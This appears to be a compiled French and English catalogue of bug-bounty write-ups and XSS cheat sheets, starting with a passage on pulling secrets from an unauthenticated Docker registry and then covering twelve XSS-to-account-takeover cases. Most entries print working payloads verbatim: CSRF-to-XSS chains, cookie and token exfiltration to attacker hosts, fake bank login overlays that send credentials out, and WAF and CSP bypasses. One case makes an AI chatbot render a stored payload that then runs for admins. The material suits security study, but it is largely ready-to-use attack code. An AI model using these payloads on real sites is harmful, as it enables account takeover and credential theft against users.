**Cause racine :** Le registre Docker est déployé sans configuration d'authentification (`REGISTRY_AUTH`), exposant l'API v2 standard publiquement, et les images elles-mêmes contiennent des secrets dans des layers intermédiaires qui restent extractibles même si un layer ultérieur les 'supprime' du filesystem final (les layers Docker sont immuables et empilés, jamais réellement effacés).

**Preuve technique (verbatim depuis la source) :**

```
Découverte et énumération :
curl http://target.example.com:5000/v2/_catalog
# {"repositories":["internal-app","payment-service","admin-panel"]}
curl http://target.example.com:5000/v2/internal-app/tags/list
# {"name":"internal-app","tags":["latest","v1.2.3"]}

Téléchargement et extraction de TOUS les layers (y compris ceux 'nettoyés' plus tard) :
docker pull target.example.com:5000/internal-app:latest
docker save target.example.com:5000/internal-app:latest -o image.tar
mkdir extracted && tar -xf image.tar -C extracted
# Chaque layer est un .tar.gz séparé -- les extraire TOUS, pas juste le dernier :
for layer in extracted/*/layer.tar; do mkdir -p "${layer%.tar}_extracted"; tar -xf "$layer" -C "${layer%.tar}_extracted" 2>/dev/null; done
grep -r -E "(AKIA[0-9A-Z]{16}|api[_-]?key|password)" extracted/ --include="*.env" --include="*.yml" --include="*.json"

Outil dédié pour automatiser l'extraction et le scan de secrets multi-layers : dockerscan, ou trufflehog directement sur l'image (`trufflehog docker --image=target.example.com:5000/internal-app:latest`).
```

**Techniques :** docker-registry-unauthenticated-catalog, image-layer-secret-extraction

**Signal (endpoints/fonctions observés) :**
- `GET /v2/_catalog`

---

## XSS — Reflected to Zero-Click ATO

*12 cas.*

### Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering

**📄 Cas réel**
[source](https://hackerone.com/reports/2509022)

A CSRF-able POST to help.shopify.com's search route lets an attacker set the AI chat bot's greeting value in the victim's session. Because the greeting is rendered as Markdown, an attacker can embed a Markdown image whose URL is a javascript: URI containing base64-encoded JavaScript, which executes when the victim clicks the rendered link — exfiltrating user context and locating/subscribing an attacker email to the victim's latest support conversation via the GraphQL messages API.

**Cause racine :** The AI chat greeting value, settable via CSRF, is rendered as Markdown without stripping javascript: URIs from image link targets, allowing script execution on click.

**Preuve technique (verbatim depuis la source) :**

```
CSRF auto-submit PoC page that sets the victim's AI-chat greeting to a malicious Markdown image whose link target is a javascript: URI:
<form id="post-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">
  <input type="hidden" name="query" value="Is this XSS?">
  <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...](javascript:eval(atob('BASE64_PAYLOAD')))">
</form>
<form id="get-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="GET">
  <input type="hidden" name="q" value="Is this XSS?">
</form>
<script>document.getElementById('post-form').submit(); setTimeout(()=>document.getElementById('get-form').submit(),2000);</script>

Decoded payload (runs on victim's click of the rendered markdown image link):
fetch(`//attacker.tld/?${JSON.stringify(window.__remixContext.state.loaderData.root.userInfo)}`);  // leak victim PII
fetch("/messages/graphql", {headers:{...}, body: `{"query":"query convs { conversations(last: 1) { edges { node { id } } } }"}`, method:"POST"})
  .then(r=>r.text()).then(data => {
    const cid = JSON.parse(data).data.conversations.edges[0].node.id;
    fetch("/messages/graphql", {headers:{...}, body: `{"query":"mutation subscriberCreate { subscriberCreate(conversationId: \\"${cid}\\", email: \\"attacker@wearehackerone.com\\") { __typename }}"}`, method:"POST"});
  });
-- subscribes the attacker's email to the victim's latest support conversation, achieving conversation hijack + PII leak on a single mouse-wheel click.
```

**Techniques :** csrf-to-xss-chain, markdown-image-javascript-uri, click-triggered-payload, graphql-data-exfiltration

**Correspond aux classes qualifiantes :** xss, csrf

**Signal (endpoints/fonctions observés) :**
- `POST https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search`
- `/messages/graphql`

**Paramètres impliqués :** `query`, `greeting`, `q`

---

### Cross-Site Scripting (XSS) Cheat Sheet

**🧾 Cheatsheet**
[source](https://academy.logicalbreach.com/cheatsheets/cross-site-scripting-xss-cheat-sheet-145d62dd)

Generic cheat sheet covering DOM-based, reflected, and stored XSS techniques, including AngularJS sandbox escapes, postMessage abuse, and cookie/session theft. Documents WAF and filter bypass methods and XSS delivery via file uploads (SVG, HTML, XSL, PDF, EXIF metadata), ending with a real-world cookie exfiltration scenario using base64-obfuscated payloads to evade keyword detection.

**Preuve technique (verbatim depuis la source) :**

```
AngularJS sandbox escape (basic): {{constructor.constructor('alert(1)')()}}
AngularJS obfuscated: {{[].pop.constructor(&#39;alert\u00281\u0029&#39;)()}}  |  {{0[a='constructor'][a]('alert(1)')()}}
postMessage injection (no origin/data validation): postMessage("<img src=0 onerror=alert()>", "*")
postMessage cookie steal via iframe: <iframe src="https://target.com/" onload="this.contentWindow.postMessage('<img src=0 onerror=fetch(\'https://attacker.com/?cookie=\'+document.cookie)>', '*')">
Body resize gadget: <iframe src="https://target.com/?search=<body onresize=alert()>" onload=this.style.width='100px'>
SVG animatetransform: <svg><animatetransform onbegin="alert()"></animatetransform></svg>
Autofocus zero-click: <xss onfocus=alert() id=x tabindex=1 autofocus>
JS-context breakout (quotes escaped): </script><script>alert()</script>
JS-context breakout (only quote escaped): \';alert();//
Template literal breakout: ${alert()}
Broken single-pass filter bypass (doubled tags): <><><img src=0 onerror=alert()>
SVG file-upload XSS: <svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
SVG xlink javascript: <svg xmlns="http://www.w3.org/2000/svg"><a style="background-image: url('javascript:alert(1)')">CLICK ME</a></svg>
EXIF metadata injection: exiftool -Comment="<script>alert(1)</script>" image.jpg
```

**Techniques :** AngularJS sandbox escape, postMessage injection without origin/data validation, cookie theft via postMessage payload, tag-specific injections (svg animatetransform, autofocus), JavaScript context breakout, WAF keyword evasion via base64 eval(atob()), jQuery hashchange XSS, broken single-pass filter bypass via doubled tags, XSS via file upload (SVG/HTML/XSL/PDF/EXIF)

**Correspond aux classes qualifiantes :** xss, account-takeover

---

### CVE-2025-24752: Reflected XSS in popup-selector Parameter of Essential Addons for Elementor ≤ 6.0.14

**📄 Cas réel**
sévérité : high · [source](https://academy.logicalbreach.com/writeups/en-cve-2025-24752-reflected-xss-in-popup-selector-parameter-of-essential-addons-for-elementor-6-0-14-406dd8ba-7004-4f61-89f2-419b67812259)

A high-severity reflected XSS (CVE-2025-24752) in the Essential Addons for Elementor WordPress plugin (≤6.0.14) was identified using a CVE scanner. The popup-selector parameter, combined with the eael-lostpassword flag, is reflected directly into the DOM without sanitization, letting an attacker execute arbitrary JavaScript via a crafted link containing an img onerror payload — exploitation requires only tricking a user into clicking the URL.

**Cause racine :** The plugin reflects the popup-selector GET parameter directly into the page DOM without output encoding or sanitization when the eael-lostpassword flag is set.

**Preuve technique (verbatim depuis la source) :**

```
Detection: ./wp-reaper-linux.bin -u https://wp-business-portal.com  (WP-Reaper v1.0, indexed 95,000+ Nuclei/ProjectDiscovery templates, flagged CVE-2025-24752 as POTENTIALLY VULNERABLE then confirmed)

PoC URL (single click, no auth required):
https://wp-business-portal.com/?popup-selector=<img src=x onerror=alert('PyUs3r')>&eael-lostpassword=1'
-- popup-selector is reflected directly into the DOM only when the eael-lostpassword flag is set; browser fails to load src=x, onerror fires, alert('PyUs3r') confirms execution.
```

**Techniques :** reflected XSS via unsanitized URL parameter, img onerror payload, unauthenticated one-click exploitation, known-CVE detection via WordPress plugin scanner

**Correspond aux classes qualifiantes :** xss

**Signal (endpoints/fonctions observés) :**
- `https://wp-business-portal.com/?popup-selector=<img src=x onerror=alert('PyUs3r')>&eael-lostpassword=1'`

**Paramètres impliqués :** `popup-selector`, `eael-lostpassword`

---

### DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover

**📄 Cas réel**
CWE-79 · [source](https://hackerone.com/reports/3608199)

The Fizzy account import page renders the selected local filename using innerHTML instead of textContent, so a crafted .zip filename containing HTML is parsed as live markup inside the authenticated import form. This allowed injecting a second submit control with an attacker-chosen formaction, turning the filename preview into an authenticated, CSRF-token-carrying request gadget — a single click on the malicious filename submits an email-change request, and redeeming the confirmation link gives a fresh authenticated victim session (also usable to create tokens or delete the account).

**Cause racine :** The import filename preview renders the user-selected local filename via innerHTML instead of textContent, allowing HTML/attribute injection that is parsed as live DOM inside the authenticated form.

**Preuve technique (verbatim depuis la source) :**

```
Malicious local filename (the ENTIRE attack payload is the FILENAME of an uploaded file, rendered via innerHTML instead of textContent):
<button formaction=&#47;40002&#47;users&#47;03frq8zae2a7m9cari0v89xua&#47;email_addresses formmethod=post name=email_address value=attacker@example.com>Take over.zip

Full chain:
1) Victim opens /account/imports/new and selects the malicious file -> preview renders a LIVE injected submit button instead of inert filename text.
2) Victim clicks it -> browser submits (with real session + real CSRF token):
POST /40002/users/03frq8zae2a7m9cari0v89xua/email_addresses
Parameters: {"authenticity_token":"[FILTERED]","email_address":"attacker@example.com","user_id":"03frq8zae2a7m9cari0v89xua"}
3) Confirmation mail delivered to attacker@example.com contains:
http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses/.../confirmation
4) Attacker visits it and submits -> server responds:
HTTP/1.1 302 Found
Location: http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/edit
Set-Cookie: session_token=...; httponly; samesite=lax
5) Attacker reuses that session_token -> GET /40002/ and GET /40002/users/.../edit both return 200 -> full victim account takeover.
Same sink also reproduced for: POST /20002/my/access_tokens (create a victim-owned PAT) and POST /20002/account/cancellation (delete the victim's account) -- just different filename payloads targeting different formaction endpoints.
Vulnerable code: app/javascript/controllers/upload_preview_controller.js (renders filename via innerHTML) + app/views/account/imports/new.html.erb.
```

**Techniques :** DOM XSS via innerHTML instead of textContent for filename preview, malicious local filename used as HTML injection vector, authenticated request gadget via injected formaction submit button, one-click CSRF-token-carrying account takeover chain

**Correspond aux classes qualifiantes :** xss, account-takeover, csrf

**Signal (endpoints/fonctions observés) :**
- `/account/imports/new`
- `/20002/my/access_tokens`
- `/20002/account/cancellation`

**Paramètres impliqués :** `email_address`

---

### DOM XSS to High Severity via Credential Phishing Overlay

**📄 Cas réel**
sévérité : high · [source](https://academy.logicalbreach.com/writeups/dom-xss-to-high-severity-via-credential-phishing-overlay-df9c3034)

A DOM-based XSS was found across multiple endpoints of a financial institution's web app where the target_route parameter is parsed client-side via new URL() without scheme validation, allowing a javascript: URI to execute inside an iframe created without a sandbox attribute. Escalated from a basic alert() PoC into a full-screen phishing overlay impersonating the bank's login page, capturing ID/username/password and exfiltrating them to an attacker server.

**Cause racine :** Client-side JavaScript builds a URL/iframe target from the unsanitized target_route parameter without validating the URI scheme, allowing javascript: URIs to execute inside an unsandboxed iframe.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable client code (no scheme validation before building the iframe target, iframe has no sandbox attribute):
const n = new URLSearchParams(window.location.search).get("target_route") || "";
let o = (e.bankframe?.src) || "";
try { l = new URL(n, o) } catch(r) { l = new URL(o) }
// javascript: URI passes straight through -> executes inside an unsandboxed same-origin iframe

Basic PoC: https://www.redacted-bank.com/retail/promotions-search?target_route=javascript:alert('PyUs3r XSS')

Full phishing-overlay payload (creates a fixed full-viewport div mimicking the bank's login, POSTs national_id/username/password to an attacker domain):
javascript:void((function(){var d=parent.document;var o=d.createElement('div');o.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif';o.innerHTML='<div style="background:#fff;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center"><img src=https://www.redacted-bank.com/assets/images/official-logo.png height=48 style=margin-bottom:24px><h2>Session Expired</h2><p>For your security, please re-enter your credentials to access Online Banking.</p><form method=GET action=https://attacker-controlled.example/steal><input name=national_id placeholder="National ID"><input name=username placeholder=Username><input type=password name=password placeholder=Password><button type=submit>Sign In to Online Banking</button></form></div>';d.body.appendChild(o)})())
Same vulnerable pattern confirmed on multiple endpoints: /retail/promotions-search, /retail/fraud-prevention, /corporate/agreements-search -- all sharing the same unvalidated target_route sink.
```

**Techniques :** DOM XSS via javascript: URI scheme, missing iframe sandbox attribute, client-side URL scheme validation bypass, credential phishing overlay injection

**Correspond aux classes qualifiantes :** xss, account-takeover

**Signal (endpoints/fonctions observés) :**
- `https://www.redacted-bank.com/retail/promotions-search?target_route=javascript:...`
- `https://www.redacted-bank.com/corporate/agreements-search?target_route=javascript:...`

**Paramètres impliqués :** `target_route`

---

### [Duplicate] Reflected XSS to Account Takeover (Credential Hijacking)

**📄 Cas réel**
sévérité : critical · [source](https://academy.logicalbreach.com/writeups/duplicate-reflected-xss-to-account-takeover-credential-hijacking-6df42df2)

A critical reflected XSS in a captive WiFi portal lets an unauthenticated attacker steal login credentials. The device_id parameter is stored server-side in the session and later reflected unencoded into a hidden input's value attribute, enabling attribute breakout and script injection that executes before the page's legitimate auto-submit handler, letting the attacker rewrite the form's action/method to silently redirect submitted credentials to an attacker server — especially effective paired with a rogue access point.

**Cause racine :** The device_id parameter is stored in the session and later embedded into an HTML input value attribute without encoding dangerous characters, allowing attribute breakout and script injection.

**Preuve technique (verbatim depuis la source) :**

```
Trigger URL (loads normally, minor 'Invalid identifier' warning, login form still works):
https://wifi-portal.redacted.com/auth/portalMenu?action=openAuth&device_id=%22%3E%3Cscript%3Ealert(%27PyUs3r%20XSS%27)%3C%2Fscript%3E
(decoded: device_id="><script>alert('PyUs3r XSS')</script>)

Server response to the follow-up POST /auth/VerifyCredentials, showing the exact injection point (inside a hidden input's value attribute, BEFORE the legitimate body onload auto-submit fires):
<html><body onload="document.createElement('form').submit.call(document.getElementById('webAuthForm'));">
<form id="webAuthForm" method="POST" action="https://university-domain.com/auth/login.cgi">
  <input type="hidden" name="username" value="test"/>
  <input type="hidden" name="password" value="test"/>
  <input type="hidden" name="device_id" value=""><script>alert(document.domain)</script>">
  <input type="hidden" name="f_Qv" value="null"/>
</form></body></html>

Stealth credential-theft variant (rewrites the legit form's action/method before the auto-submit fires):
https://wifi-portal.redacted.com/auth/portalMenu?action=openAuth&device_id=%22%3E%3Cscript%3Evar%20f%3Ddocument.forms%5B0%5D%3Bf.action%3D%27https%3A%2F%2Fattacker.com%2Fsteal%27%3Bf.method%3D%27GET%27%3Bf.submit%28%29%3B%3C%2Fscript%3E
decoded injected script: var f=document.forms[0]; f.action='https://attacker.com/steal'; f.method='GET'; f.submit();
Resulting exfil request received by the attacker:
GET /steal?username=victim&password=victim_pass&device_id=...&f_curr_time=... HTTP/1.1
Host: attacker.com
```

**Techniques :** reflected XSS via session-stored parameter reflected later, HTML attribute breakout in hidden input value, auto-submit form hijack, credential exfiltration via form action/method rewrite, captive portal / evil-twin abuse

**Correspond aux classes qualifiantes :** xss, account-takeover

**Signal (endpoints/fonctions observés) :**
- `GET /auth/portalMenu`
- `POST /auth/VerifyCredentials`
- `https://wifi-portal.redacted.com/auth/portalMenu?action=openAuth&device_id="><script>alert('PyUs3r XSS')</script>`

**Paramètres impliqués :** `device_id`, `action`

---

### Escalating a Reflected XSS to High Severity via Filter Bypass and Cache-Assisted Delivery

**📄 Cas réel**
sévérité : high · [source](https://academy.logicalbreach.com/writeups/escalating-a-reflected-xss-to-high-severity-via-filter-bypass-and-cache-assisted-delivery-f3fc7324)

A reflected XSS in a public content endpoint reflects user-controlled URL path input unsanitized into HTML attribute contexts (canonical/OG meta tags). The input filter was bypassed with a double-encoded horizontal tab to separate an injected svg tag from its onload handler, using an obfuscated self.valueOf=alert gadget. Because the poisoned response was cacheable, priming the cache upgraded the one-off reflected XSS into a semi-persistent delivery mechanism for future visitors.

**Cause racine :** User-controlled URL path input is reflected into HTML attribute values without proper encoding, and the sanitization filter fails to catch a double-encoded horizontal tab character used to separate the injected tag name from its event handler.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable reflection (path segment echoed unencoded into meta tags in <head>):
<link rel="canonical" href="https://redacted-site.example/articles/coverage-2026/INJECTED_VALUE">
<meta property="og:url" content="https://redacted-site.example/articles/coverage-2026/INJECTED_VALUE">

Payload URL (double-encoded horizontal tab -- %2509 decodes once to %09 i.e. TAB -- separates the injected tag name from its event handler, evading a filter that only checks for a literal space):
https://redacted-site.example/articles/coverage-2026/test%22%3E%3Csvg%2509onload=self.valueOf=alert;~self%3E
decoded: "><svg[TAB]onload=self.valueOf=alert;~self>

Resulting poisoned response (reflected in BOTH canonical and og:url, doubling the execution chance):
<link rel="canonical" href="https://redacted-site.example/articles/coverage-2026/test"><svg onload=self.valueOf=alert;~self>">
<meta property="og:url" content="https://redacted-site.example/articles/coverage-2026/test"><svg onload=self.valueOf=alert;~self>">
Escalation: the poisoned response is CACHEABLE -- one attacker request primes the cache, every subsequent visitor to that exact URL receives the injected HTML directly from cache with zero further attacker interaction (reflected XSS -> semi-persistent delivery via cache poisoning).
```

**Techniques :** reflected XSS via URL path reflected into HTML meta attributes, attribute breakout via double quote, double URL-encoded horizontal tab filter bypass, obfuscated svg onload execution gadget, cache poisoning for semi-persistent delivery

**Correspond aux classes qualifiantes :** xss, cache-poisoning

**Signal (endpoints/fonctions observés) :**
- `https://redacted-site.example/articles/coverage-2026/test%22%3E%3Csvg%2509onload=self.valueOf=alert;~self%3E`

---

### Escalating Reflected XSS to High Severity via WAF Bypass + Credential Phishing

**📄 Cas réel**
sévérité : high · [source](https://academy.logicalbreach.com/writeups/escalating-reflected-xss-to-high-severity-via-waf-bypass-credential-phishing-ffd8112d)

A reflected XSS on a shared navigation endpoint reflects the callback GET parameter unsanitized into a client-side JavaScript string. A WAF blocked common payloads, so the attacker smuggled the malicious code via the URL fragment (never sent to the server, invisible to network WAF inspection) — a small loader injected via callback uses Function(decodeURIComponent(location.hash.slice(1)))() to execute the fragment-carried payload, rendering a full-screen phishing overlay under the trusted origin.

**Cause racine :** The callback parameter is reflected unsanitized inside a client-side JavaScript string, and the WAF cannot inspect the URL fragment, allowing payload smuggling via location.hash combined with Function() to bypass network-level filtering entirely.

**Preuve technique (verbatim depuis la source) :**

```
Step 1 -- confirm injection + JS string context:
https://portal.redacted-target.com/api/v1/nav/goto?callback=%22%3Bprint%601%60%3B%2F%2F&ref=x
reflected as: const NAV_TARGET = "";print`1`;//";

Step 2 -- WAF bypass: WAF blocks direct alert()/fetch() payloads in the callback param (network-visible), so smuggle the real payload in the URL FRAGMENT (#...), which browsers never send to the server and which the WAF therefore never sees. The query param only carries a tiny loader:
const NAV_TARGET = "";initApp=()=>{Function(decodeURIComponent(location.hash.slice(1)))()};//"
Full URL shape: .../nav/goto?callback=<url-encoded loader>&ref=x#<url-encoded full payload>

Step 3 -- fragment payload builds a full-screen credential-phishing overlay (decoded core):
document.body.innerHTML=`<div id=bg><div id=bx><img id=logo src="https://portal.redacted-target.com/assets/logo.png" height=48><h2 id=ttl>Session Expired</h2><p id=sub>For your security, please sign in again to continue.</p><input id=f1 name=uid placeholder=Username><input id=f2 name=pwd type=password placeholder=Password><button id=btn>Sign In</button></div></div>`;
Object.assign(bg.style,{position:'fixed',top:0,left:0,width:'100vw',height:'100vh',background:'rgba(0,0,0,0.75)',zIndex:99999,display:'flex',alignItems:'center',justifyContent:'center'});
btn.onclick=()=>{new Image().src='https://attacker.example/c?u='+encodeURIComponent(f1.value)+'&p='+encodeURIComponent(f2.value);btn.textContent='Verifying...'}

Why it bypasses the WAF -- comparison table from the writeup:
query param (callback): sent to server=YES, WAF inspects=YES, contains only the tiny loader
URL fragment (#...): sent to server=NO, WAF inspects=NO, contains the FULL phishing payload
```

**Techniques :** reflected XSS via JavaScript string context breakout, WAF bypass using location.hash as out-of-band delivery channel, Function() constructor for dynamic code execution, credential phishing overlay injection

**Correspond aux classes qualifiantes :** xss, account-takeover

**Signal (endpoints/fonctions observés) :**
- `https://portal.redacted-target.com/api/v1/nav/goto?callback=...&ref=x`

**Paramètres impliqués :** `callback`, `ref`

---

### Stored XSS in attachment-display exploitable through SameSite

**📄 Cas réel**
[source](https://hackerone.com/reports/3594137)

Roundcube's compose attachment preview endpoint renders uploaded HTML files inline without a restrictive CSP, unlike the general attachment viewer which enforces script-src 'none'. Because the endpoint requires a session-bound key only generated when composing new mail, an attacker cannot target a victim directly, but finding any XSS on another service on the same parent domain enables 'cookie tossing' to set Roundcube session cookies while preserving the victim's own session, then redirecting the victim to trigger execution under the Roundcube origin — letting any co-hosted XSS take over Roundcube accounts.

**Cause racine :** The display-attachment endpoint streams uploaded HTML attachments directly with only a Content-Type header, without the CSP protection applied by the standard attachment viewer, allowing embedded scripts to execute under the Roundcube origin.

**Preuve technique (verbatim depuis la source) :**

```
PoC script output (python3 poc.py) shows the attacker uploading an HTML attachment to a legit compose flow and getting back a session-bound display key:
{'roundcube_sessid': '1798cbb4c1d7c7f9ca26069b52aac1aa', 'roundcube_sessauth': 'GfNmiyX5brPm4l814QUx62l5gsJKBXfU-...'}
compose_id='183727919869aecb6499f76'
{"action":"upload","exec":"this.add2attachment_list(\"rcmfile11773063013009066400\",{...\"name\":\"xss.html\",\"mimetype\":\"text/html\"...}"}
att_id='11773063013009066400'

Cookie-tossing payload (executed via ANY unrelated XSS on a sibling subdomain of the SAME parent domain -- Path scoped to preserve the victim's own session cookie elsewhere):
document.cookie='roundcube_sessid=1798cbb4c1d7c7f9ca26069b52aac1aa; Path=/index.php/xss; Domain=.target.local'
document.cookie='roundcube_sessauth=GfNmiyX5brPm4l814QUx62l5gsJKBXfU-1773063000; Path=/index.php/xss; Domain=.target.local'
location.href = 'http://mail.target.local/index.php/xss?_task=mail&_action=display-attachment&_id=183727919869aecb6499f76&_file=rcmfile11773063013009066400';
-- HTML attachment renders inline with NO CSP (unlike the hardened mail/get.php viewer which sets script-src 'none') -> victim's browser executes the attacker's stored HTML under the Roundcube origin, using the attacker-tossed session cookies scoped narrowly enough not to disturb the victim's normal session at other paths.
Root cause: mail/attachment_display -> rcube_uploads::display_uploaded_file() sets only Content-Type and streams the body directly for HTML attachments, unlike mail/get.php which wraps HTML safely + sets CSP.
```

**Techniques :** stored XSS via HTML file upload without restrictive CSP, missing CSP on attachment preview endpoint (contrast with hardened viewer), cross-service cookie tossing, Path=-scoped cookie setting to preserve victim session

**Correspond aux classes qualifiantes :** xss, account-takeover

**Signal (endpoints/fonctions observés) :**
- `mail/attachment_display`
- `mail/get.php`
- `/index.php/xss?_task=mail&_action=display-attachment&_id=...&_file=...`

**Paramètres impliqués :** `_task`, `_action`, `_id`, `_file`

---

### Stored XSS via SVG Upload Horizontal Tab Character Filter Evasion

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/stored-xss-via-svg-upload-horizontal-tab-character-filter-evasion-47555d37-871d-4e40-88bd-a12819f158cc)

A chat platform's SVG upload sanitizer stripped javascript: URIs from SVG <a href> attributes using a raw string comparison, but didn't account for browser URL-parser normalization, which silently strips ASCII control characters like the horizontal tab. Injecting a tab-obfuscated 'javascript:' scheme wasn't recognized by the filter while the browser still resolved and executed it on click — the malicious SVG is stored server-side and re-executes for every user who opens the shared conversation.

**Cause racine :** The SVG sanitizer performs a raw string match for the javascript: scheme in href attributes without normalizing control characters, allowing a horizontal-tab-obfuscated scheme that the browser still parses and executes as valid JavaScript.

**Preuve technique (verbatim depuis la source) :**

```
Filter bypass: the sanitizer does a raw STRING match for the literal 'javascript:' scheme, but browsers silently strip ASCII control characters (including horizontal tab U+0009) when parsing a URI scheme. A tab-obfuscated scheme string bypasses the raw-string filter while the browser still resolves and executes it:
j&#09;avascript:confirm(document.cookie)
-- filter sees "j[TAB]avascript:..." (doesn't match "javascript:"), browser normalizes to "javascript:confirm(document.cookie)" and executes it on click.

Malicious SVG structure (uploaded as a normal chat attachment):
<svg xmlns="http://www.w3.org/2000/svg">
  <a href="j&#09;avascript:confirm(document.cookie)">Click me</a>
</svg>
Stored server-side unmodified, rendered inline in the platform's own origin for every user who opens the shared conversation -- one click on the visible link triggers execution under chat.ai-platform.net, with full access to session cookies/tokens/DOM.
```

**Techniques :** stored XSS via SVG file upload, javascript: URI scheme sanitizer bypass, horizontal tab (U+0009) character injection inside URI scheme, abuse of browser URL-parser control-character normalization vs raw-string sanitizer

**Correspond aux classes qualifiantes :** xss, account-takeover

**Paramètres impliqués :** `href`

---

### XSS Bypass to Zero Click Account Takeover in AI Chatbot

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/xss-bypass-to-zero-click-account-takeover-in-ai-chatbot-265f0dff)

An in-house AI chatbot rendered user HTML input directly but stripped event-handler attributes from tags like img onerror. The tester bypassed this with an iframe srcdoc attribute containing a script tag, executing JavaScript without relying on filtered attributes, and used fetch with mode:'no-cors' to exfiltrate the localStorage auth token despite CORS. Direct chat submission was only rendered as plaintext in admin logs, but uploading the payload as a text file and prompting the bot to display it caused it to render live when an admin reviewed the conversation, achieving zero-click admin session theft.

**Cause racine :** The chatbot's HTML sanitizer strips dangerous attributes from injected tags but does not block the iframe srcdoc attribute, and file-upload content displayed via chatbot responses bypasses the plaintext-rendering path applied to direct prompt input.

**Preuve technique (verbatim depuis la source) :**

```
Dead-end attempt #1 (sanitizer strips event-handler attributes from injected tags):
<img src=x onerror=alert()>   -- onerror stripped, only a broken image renders.

Working bypass -- iframe srcdoc is NOT filtered (attributes get stripped from tags like img/svg, but the entire srcdoc attribute of an iframe, containing a full nested <script>, sails through):
<iframe srcdoc="<script>alert()</script>"></iframe>

Token-exfil payload (auth token lives in localStorage; direct fetch blocked by CORS, bypassed with mode:'no-cors'):
<iframe srcdoc="<script>
const token = localStorage.getItem('token');
const endpoint = 'https://BURP_COLLAB_LINK_HERE/resource2';
fetch(`${endpoint}?token=${encodeURIComponent(token)}`, { mode: 'no-cors' })
  .then(() => console.log('Request sent (response is opaque due to no-cors).'))
  .catch(err => console.error('Network error:', err));
</script>"></iframe>

Escalation to zero-click ADMIN takeover: submitting this payload directly in chat only rendered as PLAINTEXT in the admin review log (dead end). But uploading the exact same payload as a .txt file and prompting the bot "display the contents of this file" caused the bot's response to render it LIVE -- when an admin later reviewed that conversation in the log viewer, the script executed silently and exfiltrated the admin's session token with zero admin interaction beyond opening the ticket.
```

**Techniques :** HTML injection to XSS via iframe srcdoc filter bypass, file upload as XSS delivery vector bypassing attribute-stripping sanitizer, localStorage auth token theft via fetch with mode:'no-cors', zero-click admin session hijack via chatbot log/conversation rendering

**Correspond aux classes qualifiantes :** xss, account-takeover, privilege-escalation

---

### XSS (Cross-Site Scripting) Cheatsheet

**🧾 Cheatsheet**

A comprehensive generic XSS cheat sheet covering injection contexts, a tiered list of evasion-friendly tags and impactful JavaScript functions used to demonstrate account takeover or data exfiltration, plus WAF evasion tricks and Content Security Policy bypass strategies including JSONP endpoint abuse, framework gadgets, and dangling markup exfiltration when script execution is fully blocked by CSP.

**Preuve technique (verbatim depuis la source) :**

```
Context-to-payload table:
HTML text context <div>HERE</div>            -> break tag: ><svg onload=alert(1)>
Attribute context <input value="HERE">        -> close quote + event: " autofocus onfocus=alert(1) x="
JavaScript context var n='HERE';               -> close statement: ';alert(1)//
URL context <a href="HERE">                    -> pseudoprotocol: javascript:alert(1)

Zero-click trigger events: onload (<svg onload=...>, <body onload=...>), onerror (<img src=x onerror=...>), onfocus+autofocus (<input onfocus=... autofocus>), onanimationstart (needs injected @keyframes CSS, evades filters that only look for load/error).
Data-exfil impact payloads: fetch('https://your-server.com?cookie=' + document.cookie)  |  fetch('//attacker.com?token=' + localStorage.getItem('access_token'))  |  document.body.innerHTML = '<h1>HACKED</h1>' (defacement PoC)
WAF fingerprinting: send < > " ' ( ) individually, see which get filtered/reflected unchanged.
WAF bypass tricks: backticks instead of parens (alert`1`), slash instead of space (<svg/onload=...>).

CSP bypass A -- JSONP endpoint whitelisted by the CSP (e.g. accounts.google.com is often allow-listed):
"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
CSP bypass B -- framework gadget when unsafe-eval is allowed and AngularJS is loaded on the page:
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
CSP bypass C -- dangling markup exfiltration when NO script execution is possible at all (strict CSP), still leaks data up to the next quote:
<img src='https://attacker.com/log?data=   (browser sends everything up to the next " it finds in the DOM as part of the image request URL)
```

**Techniques :** execution context injection strategies (HTML text, attribute, JavaScript, URL pseudoprotocol), tiered tag selection for evasion (svg, iframe srcdoc, details ontoggle), zero-click trigger events (onload, onerror, onfocus+autofocus), interaction-required trigger events (onclick, ontoggle), impact functions (fetch/XHR, document.cookie, localStorage theft, eval, innerHTML defacement), WAF bypass via backticks/slashes/subdomain chaining, CSP bypass via JSONP endpoint abuse, CSP bypass via framework gadgets (AngularJS unsafe-eval), dangling markup exfiltration

**Correspond aux classes qualifiantes :** xss, account-takeover

---
